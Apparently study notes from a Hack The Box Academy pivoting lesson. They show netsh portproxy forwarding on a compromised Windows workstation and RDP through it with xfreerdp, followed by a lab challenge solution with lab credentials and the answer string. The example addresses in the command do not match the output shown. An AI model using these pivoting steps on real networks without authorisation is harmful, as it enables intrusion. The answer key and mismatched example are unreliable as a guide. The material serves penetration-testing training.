@@ -1,0 +1,37 @@
+Netsh is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use Netsh for:
+
+Finding routes
+Viewing the firewall configuration
+Adding proxies
+Creating port forwarding rules
+Let's take an example of the below scenario where our compromised host is a Windows 10-based IT admin's workstation (10.129.15.150,172.16.5.25). Keep in mind that it is possible on an engagement that we may gain access to an employee's workstation through methods such as social engineering and phishing. This would allow us to pivot further from within the network the workstation is in.
+
+We can use netsh.exe to forward all data received on a specific port (say 8080) to a remote host on a remote port. This can be performed using the below command.
+
+Syntax on compromsied Windows Workstation using netsh.exe to port forward: C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.2
+
+Verify Port Forward on Windows Machine: 
+
+Syntax: C:\Windows\system32> netsh.exe interface portproxy show v4tov4
+
+Listen on ipv4:             Connect to ipv4:
+
+Address         Port        Address         Port
+--------------- ----------  --------------- ----------
+10.129.42.198   8080        172.16.5.25     3389
+
+
+After configuring the portproxy on our Windows-based pivot host, we will try to connect to the 8080 port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by netsh.exe.
+
+So from ATTACK HOST: xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123
+
+
+Challege:  RDP to 10.129.4.96 (ACADEMY-PIVOTING-WIN10PIV) with user "htb-student" and password "HTB_@cademy_stdnt!" - jim flip flop  
+Using the concepts covered in this section, take control of the DC (172.16.5.19) using xfreerdp by pivoting through the Windows 10 target host. Submit the approved contact's name found inside the "VendorContacts.txt" file located in the "Approved Vendors" folder on Victor's desktop (victor's credentials: victor:pass@123) . (Format: 1 space, not case-sensitive)
+
+1) xfreerdp /v:10.129.4.96 /u:htb-student /p:HTB_@cademy_stdnt!
+2) on RDP'd windows session open CMD and run as admin: netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.4.96 connectport=3389 connectaddress=172.16.5.19
+3) confirm the port forward: netsh.exe interface portproxy show v4tov4
+4) xfreerdp /v:10.129.4.96:8080 /u:victor /p:pass@123
+5) select Approved Vendors folder -> vendorcontacts.txt -> jim flip flop 
+
